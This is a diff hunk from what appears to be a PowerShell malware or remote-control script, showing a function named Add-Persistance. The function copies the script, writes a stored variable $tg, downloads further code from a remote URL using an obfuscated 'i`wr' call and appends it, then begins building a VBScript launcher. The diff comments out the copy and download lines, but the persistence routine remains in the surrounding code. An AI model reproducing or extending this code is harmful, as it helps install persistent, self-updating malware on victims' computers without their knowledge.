@@ -395,15 +395,15 @@ Write-Output "Done."
 
 Function Add-Persistance{
 #$newScriptPath = "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
-$newScriptPath = "$env:USERPROFILE\Desktop\test\copy.ps1"
-$scriptContent | Out-File -FilePath $newScriptPath -force
-sleep 1
-if ($newScriptPath.Length -lt 100){
-    "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
-    i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
-    sleep 1
-    Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
-    }
+#$newScriptPath = "$env:USERPROFILE\Desktop\test\copy.ps1"
+#$scriptContent | Out-File -FilePath $newScriptPath -force
+#sleep 1
+#if ($newScriptPath.Length -lt 100){
+#    "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
+#    i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
+#    sleep 1
+#    Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
+#    }
 $tobat = @'
 Set objShell = CreateObject("WScript.Shell")
 userProfile = objShell.ExpandEnvironmentStrings("%USERPROFILE%")
